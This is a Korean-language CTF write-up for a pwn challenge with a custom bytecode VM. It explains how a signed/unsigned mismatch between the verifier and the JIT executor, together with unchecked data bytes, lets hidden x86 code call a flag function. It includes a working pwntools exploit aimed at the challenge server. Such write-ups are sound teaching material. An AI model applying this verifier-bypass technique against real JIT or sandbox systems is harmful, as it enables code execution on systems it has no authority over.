---
ctf_name: "BDSecCTF"
challenge_name: "Muktir Shongket"
category: "pwn"
difficulty: "medium"
author: "aswe0810m"
date: "2026-07-21"
points: 100
tags: [custom-vm, bytecode, verifier-bypass, jit-execution]
---

# Muktir Shongket

## 문제 설명

> During Bangladesh's Liberation War, field operatives relied on coded transmissions to coordinate their resistance against the Pakistani military.
>
> A recovered communication terminal still accepts operational orders and verifies every transmission before execution.
>
> The verification unit and the field engine may not agree on the route.
>
> Flag Format : BDSEC{s0mething_here}

- `nc 45.56.67.129 53916`
- 바이너리 파일 제공: `muktir_shongket`

## 풀이

### 분석

ELF 64-bit, No PIE, Full RELRO, Canary, NX enabled, stripped 바이너리다.

프로그램은 커스텀 바이트코드 VM으로, 6개 메뉴를 가진 터미널 프로그램이다.

1. Upload coded transmission — hex 문자열로 바이트코드 입력
2. Inspect decoded orders — 바이트코드 디스어셈블 출력
3. Verify transmission — 바이트코드 검증 (Verifier)
4. Execute transmission — 바이트코드를 x86 네이티브로 번역 후 실행 (Executor)
5. Clear terminal
6. Disconnect

바이트코드 opcode 체계는 다음과 같다.

| 바이트 | 이름 | 소스 소비 | 설명 |
|--------|------|-----------|------|
| `0x10` | SIGNAL | 1 | NOP 생성 |
| `0x20` | ROUTE | 9 (1+8) | 8바이트 데이터를 실행 버퍼에 삽입 (EB 08로 점프) |
| `0x30` | WAIT | 2 (1+1) | JMP rel32 생성 |
| `0x40` | END | 1 | RET 생성 |
| `0xF0` | FREEDOM | - | flag.txt 읽기 (Verifier가 거부) |

Execute(4번)는 `mmap(RW)` → 바이트코드를 x86로 번역 → `mprotect(RX)` → `call` 구조의 JIT 실행이다.

flag.txt를 읽는 함수는 `0x401bb0`에 존재하며, FREEDOM(0xF0) opcode를 통해 호출되지만 Verifier가 FREEDOM을 발견하면 즉시 거부한다.

### 취약점

문제 힌트 *"The verification unit and the field engine may not agree on the route"* 가 가리키는 것은 Verifier와 Executor 사이의 파싱 불일치다. 두 가지 불일치가 존재한다.

**1. WAIT operand의 signed/unsigned 해석 차이**

- Verifier: `movzx` (unsigned) → 0xF3 = 243으로 해석, 순방향 bounds check에 사용
- Executor: `movsx` (signed) → 0xF3 = -13으로 해석, JMP rel32의 displacement로 사용

Verifier는 WAIT의 operand를 "목적지가 소스 범위 안에 있는가?"만 검사하고, 실제로 점프하지 않는다. 반면 Executor는 이 값을 sign-extend해서 JMP rel32 명령어를 생성하므로, 음수 displacement로 역방향 점프가 가능하다.

**2. ROUTE 데이터 미검사**

Verifier는 ROUTE의 8바이트 데이터 내용을 전혀 검사하지 않는다. Executor는 이 8바이트를 실행 가능한 버퍼에 그대로 넣는다(EB 08로 점프하여 정상 흐름에서는 건너뜀). 따라서 ROUTE 데이터에 임의의 x86 코드를 숨길 수 있다.

### 익스플로잇

ROUTE 데이터에 flag 함수를 호출하는 x86 코드를 숨기고, WAIT의 signed/unsigned 차이를 이용해 해당 코드로 역방향 점프한다.

Executor가 생성하는 출력 버퍼 레이아웃은 다음과 같다.

```
offset 0: EB 08 ROUTE: jmp +8 (데이터 건너뜀)
offset 2: 68 b0 1b 40 00 push 0x401bb0 (flag 함수 주소)
offset 7: C3 ret (flag 함수로 점프)
offset 8: 90 90 nop padding
offset 10: E9 F3 FF FF FF WAIT: jmp rel32 → target = 15 + (-13) = offset 2
offset 15: 90 × 243 SIGNAL → NOP (패딩)
offset 258: C3 END → RET
```
실행 흐름: offset 0 → (jmp +8) → offset 10 → (jmp -13) → offset 2 → `push 0x401bb0; ret` → flag 함수 실행

Verifier bounds check 통과 조건: WAIT가 소스 offset 9에 있고 operand가 unsigned 243이므로, 243 + 9 + 2 = 254 < 255(총 소스 크기). 이를 위해 WAIT 뒤에 SIGNAL 243개와 END 1개를 패딩으로 붙인다.

```python
from pwn import *

payload = b""
payload += b"\x20"                              # ROUTE opcode
payload += b"\x68\xb0\x1b\x40\x00\xc3\x90\x90"  # push 0x401bb0; ret; nop; nop
payload += b"\x30\xf3"                           # WAIT + operand 0xF3 (signed: -13)
payload += b"\x10" * 243                         # 243 SIGNALs (padding)
payload += b"\x40"                               # END

r = remote("45.56.67.129", 53916)
r.recvuntil(b"> ")

r.sendline(b"1")                    # Upload
r.recvuntil(b"Hex transmission: ")
r.sendline(payload.hex().encode())
r.recvuntil(b"> ")

r.sendline(b"3")                    # Verify
r.recvuntil(b"> ")

r.sendline(b"4")                    # Execute
r.interactive()
```

## 플래그
```
BDSEC{mukt1r_5h0ngk3t_r34ch3d_th3_f13ld}
```

## 배운 점

- 커스텀 VM 문제에서는 각 opcode의 소비 바이트 수와 해석 방식을 verifier/executor 양쪽에서 비교 분석하는 것이 핵심이다.
- signed/unsigned 해석 차이(`movzx` vs `movsx`)는 실제 보안에서도 빈번한 취약점 패턴이다. 방화벽/IDS가 패킷을 파싱하는 방식과 서버가 파싱하는 방식이 달라서 우회되는 것과 같은 원리다.
- JIT 실행 구조에서 데이터 영역(ROUTE)에 코드를 숨기고 제어 흐름(WAIT)으로 실행시키는 기법은 실제 JIT spray 공격과 유사하다.
- `strings` + 핵심 API 호출 패턴(`mmap`→`mprotect`→`call`) 분석만으로도 stripped 바이너리의 전체 구조를 파악할 수 있다.